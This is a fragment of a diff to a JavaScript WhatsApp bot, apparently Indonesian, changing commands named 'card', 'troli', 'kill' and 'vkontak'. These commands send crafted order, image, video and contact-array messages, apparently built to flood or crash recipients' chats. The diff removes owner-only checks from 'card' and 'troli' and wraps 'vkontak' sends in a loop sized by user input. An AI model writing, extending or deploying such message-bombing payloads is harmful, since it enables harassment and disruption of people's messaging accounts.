@@ -4848,7 +4848,6 @@ kurr.updatePresence(from, Presence.composing)
 })
 break
 case 'card':
-if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        argz = arg.split("|")
    if (!argz) return reply(`Penggunaan ${prefix}card teks|jumlah`)
     if (isNaN(argz[1])) return reply(`Penggunaan ${prefix}card teks|jumlah`)
@@ -4874,7 +4873,6 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        }
        break
 case 'troli':
-if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 for (let i = 0; i < (q) ; i++){
                res = await kurr.prepareMessageFromContent(from, {
 					"orderMessage": {
@@ -5098,7 +5096,7 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  kurr.relayWAMessage(res)
  break
 case 'kill':
-res = await kurr.prepareMessageFromContent(from, {
+res = await kurr.prepareMessageFromContent(from,{
 					"imageMessage": {
 						"url": "https://mmg.whatsapp.net/d/f/Anv-4_S8w9lO1dgjQV3t6vxi9gHY9_4jKXTnzzwdWTmD.enc",
 						"mimetype": "image/jpeg",
@@ -5116,7 +5114,7 @@ res = await kurr.prepareMessageFromContent(from, {
 				}, {quoted: troli, contextInfo:{}}) 
  kurr.relayWAMessage(res)
 
-  res = await kurr.prepareMessageFromContent(from, {
+  res = await kurr.prepareMessageFromContent(from,{
 					"videoMessage": {
 						"url": "https://mmg.whatsapp.net/d/f/Ajn3Ryd38BU5UXekN2ju6Z8stiJIRZ3DT6rBXmzfA1wB.enc",
 						"mimetype": "video/mp4",
@@ -5162,6 +5160,7 @@ res = await kurr.prepareMessageFromContent(from,{
     break
 case 'vkontak':
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
+for (let i = 0; i < (q) ; i++){
   res = await kurr.prepareMessageFromContent(from, {
 					"contactsArrayMessage": {
 						"displayName": "7 kontak",
